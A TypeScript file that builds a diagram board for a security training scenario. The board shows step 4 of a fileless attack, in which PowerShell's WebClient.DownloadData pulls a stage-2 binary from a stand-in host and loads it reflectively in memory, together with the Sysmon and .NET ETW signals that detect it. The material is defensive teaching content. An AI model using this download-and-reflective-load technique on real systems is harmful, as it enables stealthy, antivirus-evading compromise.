import type { TechnicalBoardDescriptor } from '@/lib/section-excalidraw-registry';
import { CHALK } from '../chalk';
import { ARROW_GAP, box, hArrow, note, sticky, title, vArrow } from '../helpers';

export function step4Board(): TechnicalBoardDescriptor {
  const y1 = 96;
  const h1 = 124;
  const y2 = 308;
  const h2 = 128;

  const stager = { id: 's4-stager', x: 40, w: 245 };
  const download = { id: 's4-dl', x: stager.x + stager.w + ARROW_GAP, w: 260 };
  const reflect = { id: 's4-reflect', x: download.x + download.w + ARROW_GAP, w: 270 };
  const ntfs = { id: 's4-ntfs', x: download.x, w: 260 };
  const etw152 = { id: 's4-etw', x: reflect.x, w: 270 };

  return {
    scenarioId: 'amsi-reflective-dll',
    sectionKey: 'step-4',
    boardBadge: 'TECH BOARD · STEP #4',
    title: 'Step #4 · Zero-Disk Download & Reflective CLR / DLL Load',
    subtitle: 'Streaming 184 KB straight into unbacked MEM_PRIVATE RWX RAM with 0 bytes on NTFS.',
    chalkHint: 'Hover each box to compare the untouched NTFS disk with unbacked RAM execution.',
    tooltips: {
      's4-stager': {
        kind: 'network',
        title: 'HTTPS Stage-2 Stager',
        module: '198.51.100.74:443 · TLS 1.3',
        signature: 'GET /assets/stage2.bin  (184 KB byte array)',
        fields: [
          { key: 'dst', type: 'endpoint', value: '198.51.100.74:443' },
          { key: 'telemetry', type: 'Sysmon', value: 'Event ID 3 (NetworkConnect)' },
        ],
        explain:
          'PowerShell connects over HTTPS to download the raw PE/CLR binary directly into memory without saving a file.',
      },
      's4-dl': {
        kind: 'api',
        title: 'WebClient.DownloadData()',
        module: 'System.Net.WebClient',
        signature: 'byte[] $bytes = (New-Object Net.WebClient).DownloadData($url)',
        fields: [
          { key: 'output', type: 'byte[]', value: '184 KB managed RAM buffer' },
          { key: 'diskWrites', type: 'int', value: '0 bytes (zero NTFS touch)' },
        ],
        explain:
          'Unlike DownloadFile, DownloadData keeps the entire payload inside a volatile byte array in RAM so disk AV never scans it.',
      },
      's4-reflect': {
        kind: 'memory',
        title: '[Assembly]::Load / ReflectiveLoader',
        module: 'MEM_PRIVATE RWX @ 0x000001E4A2100000',
        signature: 'MZ (4D 5A) + Relocations + IAT resolved strictly in RAM',
        fields: [
          { key: 'base', type: 'PVOID', value: '0x000001E4A2100000' },
          { key: 'backingFile', type: 'string', value: 'NONE (Unbacked MEM_PRIVATE)' },
          { key: 'protect', type: 'DWORD', value: '0x40 (PAGE_EXECUTE_READWRITE)' },
        ],
        explain:
          'The CLR or ReflectiveLoader maps sections, resolves imports, and executes the entry point directly inside volatile RAM.',
      },
      's4-ntfs': {
        kind: 'note',
        title: 'NTFS Disk Untouched (0.0 kg)',
        module: 'Sysmon Event ID 11 Silent',
        signature: 'FileCreate Events = 0 · On-Disk Hash Scans Bypassed',
        fields: [
          { key: 'diskBytes', type: 'int', value: '0 Bytes' },
          { key: 'sysmon11', type: 'EID', value: 'Not Triggered' },
        ],
        explain:
          'Because no payload ever lands on the hard drive, file-creation monitors stay silent — forcing defenders to hunt in RAM and ETW.',
      },
      's4-etw': {
        kind: 'detect',
        title: '.NET Runtime ETW EID 152',
        module: 'Microsoft-Windows-DotNETRuntime',
        signature: 'AssemblyLoad { Name: "Stage2Recon", FullyQualifiedPath: "" }',
        fields: [
          { key: 'eventId', type: 'ETW', value: '152 (AssemblyLoad)' },
          { key: 'path', type: 'string', value: '"" (Empty = Memory-Only!)' },
        ],
        explain:
          'Correlating Sysmon Event ID 3 with .NET ETW Event ID 152 empty-path assembly loads catches fileless execution cleanly.',
      },
      's4-sticky': {
        kind: 'note',
        title: 'Fileless Hunting Triad',
        module: 'Memory + Network + CLR',
        fields: [
          { key: 'net', type: 'Sysmon', value: 'EID 3 -> 198.51.100.74:443' },
          { key: 'clr', type: 'ETW', value: 'EID 152 (Path == "")' },
          { key: 'ram', type: 'VAD', value: 'Unbacked RWX MZ @ 0x1E4A2100000' },
        ],
        explain:
          'Even with zero disk files, unbacked executable MZ headers in RAM plus CLR ETW 152 expose the reflective implant.',
      },
    },
    skeletons: [
      title(40, 14, 'Step #4 · Zero-Disk HTTPS Pull & Reflective Memory Load'),
      box({
        id: stager.id,
        x: stager.x,
        y: y1,
        w: stager.w,
        h: h1,
        label: 'HTTPS Payload Stager\n198.51.100.74:443\nSysmon EID 3 Logged',
        stroke: CHALK.attacker,
        fill: CHALK.attackerFill,
      }),
      ...hArrow({
        id: 's4-a1',
        fromId: stager.id,
        toId: download.id,
        fromRight: stager.x + stager.w,
        toLeft: download.x,
        midY: y1 + h1 / 2,
        caption: 'TLS 1.3 Stream',
        stroke: CHALK.api,
      }),
      box({
        id: download.id,
        x: download.x,
        y: y1,
        w: download.w,
        h: h1,
        label: 'WebClient.DownloadData\nbyte[] $bytes (184 KB)\nRAM Only · No File',
        stroke: CHALK.api,
        fill: CHALK.apiFill,
      }),
      ...hArrow({
        id: 's4-a2',
        fromId: download.id,
        toId: reflect.id,
        fromRight: download.x + download.w,
        toLeft: reflect.x,
        midY: y1 + h1 / 2,
        caption: 'Assembly.Load',
        stroke: CHALK.warn,
      }),
      box({
        id: reflect.id,
        x: reflect.x,
        y: y1,
        w: reflect.w,
        h: h1,
        label: 'Reflective PE/CLR RAM\n0x000001E4A2100000\nMEM_PRIVATE RWX (4D 5A)',
        stroke: CHALK.attacker,
        fill: CHALK.attackerFill,
      }),
      ...vArrow({
        id: 's4-a3',
        fromId: download.id,
        toId: ntfs.id,
        midX: download.x + download.w / 2,
        fromBottom: y1 + h1,
        toTop: y2,
        caption: '0 Bytes Disk',
        stroke: CHALK.ghost,
      }),
      ...vArrow({
        id: 's4-a4',
        fromId: reflect.id,
        toId: etw152.id,
        midX: reflect.x + reflect.w / 2,
        fromBottom: y1 + h1,
        toTop: y2,
        caption: 'CLR Witness',
        stroke: CHALK.ok,
      }),
      sticky({
        id: 's4-sticky',
        x: 40,
        y: y2,
        w: 335,
        h: h2,
        label:
          'NOTE · ZERO FLOOR WEIGHT\nNTFS Disk stays 0.0 kg (no EID 11).\nCatch via Sysmon EID 3 + CLR EID 152\n+ Unbacked MEM_PRIVATE RWX MZ.',
      }),
      box({
        id: ntfs.id,
        x: ntfs.x,
        y: y2,
        w: ntfs.w,
        h: h2,
        label: 'NTFS Disk Scale: 0.0 kg\nSysmon EID 11 = NONE\nDisk AV Sees Nothing',
        stroke: CHALK.muted,
        fill: CHALK.trustedFill,
      }),
      box({
        id: etw152.id,
        x: etw152.x,
        y: y2,
        w: etw152.w,
        h: h2,
        label: '.NET ETW Event ID 152\nAssemblyLoad Path = ""\nUnbacked Memory Exec',
        stroke: CHALK.ok,
        fill: CHALK.okFill,
      }),
      note(40, 466, 'Hover any box to inspect zero-disk indicators and CLR ETW telemetry.', CHALK.muted),
    ],
  };
}
